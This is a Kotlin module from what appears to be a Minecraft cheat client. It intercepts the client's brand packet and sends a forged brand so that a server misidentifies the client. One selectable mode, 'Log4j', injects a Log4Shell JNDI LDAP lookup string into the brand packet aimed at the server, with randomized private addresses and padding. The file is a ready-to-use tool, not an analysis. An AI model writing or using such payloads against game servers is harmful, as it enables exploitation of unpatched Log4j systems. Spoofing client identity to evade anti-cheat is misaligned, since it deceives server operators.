package net.aspw.client.features.module.impl.other

import io.netty.buffer.Unpooled
import net.aspw.client.event.EventTarget
import net.aspw.client.event.PacketEvent
import net.aspw.client.features.module.Module
import net.aspw.client.features.module.ModuleCategory
import net.aspw.client.features.module.ModuleInfo
import net.aspw.client.utils.PacketUtils
import net.aspw.client.utils.misc.RandomUtils
import net.aspw.client.value.ListValue
import net.aspw.client.value.TextValue
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C17PacketCustomPayload

/**
 * The type Client spoof.
 */
@ModuleInfo(name = "BrandSpoofer", spacedName = "Brand Spoofer", category = ModuleCategory.OTHER, forceNoSound = true)
class BrandSpoofer : Module() {
    /**
     * The Mode value.
     */
    val modeValue = ListValue(
        "Mode", arrayOf(
            "Vanilla",
            "OptiFine",
            "Fabric",
            "Lunar",
            "LabyMod",
            "CheatBreaker",
            "PvPLounge",
            "Geyser",
            "Log4j",
            "Custom"
        ), "Vanilla"
    )

    private val customValue = TextValue("Custom-Brand", "WTF") { modeValue.get().equals("custom", true) }

    @EventTarget
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (!mc.isIntegratedServerRunning) {
            if (packet is C17PacketCustomPayload) {
                if ((event.packet as C17PacketCustomPayload).channelName.equals("MC|Brand", ignoreCase = true)) {
                    when (modeValue.get()) {
                        "Vanilla" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("vanilla")
                            )
                        )

                        "OptiFine" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("optifine")
                            )
                        )

                        "Fabric" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("fabric")
                            )
                        )

                        "LabyMod" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("LMC")
                            )
                        )

                        "CheatBreaker" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("CB")
                            )
                        )

                        "PvPLounge" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("PLC18")
                            )
                        )

                        "Geyser" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("eyser")
                            )
                        )

                        "Lunar" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "REGISTER",
                                PacketBuffer(Unpooled.buffer()).writeString("Lunar-Client")
                            )
                        )

                        "Log4j" -> {
                            val str =
                                "\${jndi:ldap://192.168.${RandomUtils.nextInt(1, 253)}.${RandomUtils.nextInt(1, 253)}}"
                            PacketUtils.sendPacketNoEvent(
                                C17PacketCustomPayload(
                                    "MC|Brand",
                                    PacketBuffer(Unpooled.buffer()).writeString(
                                        "${RandomUtils.randomString(5)}$str${
                                            RandomUtils.randomString(
                                                5
                                            )
                                        }"
                                    )
                                )
                            )
                        }

                        "Custom" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString(customValue.get())
                            )
                        )
                    }
                }
                event.cancelEvent()
            }
        }
    }
}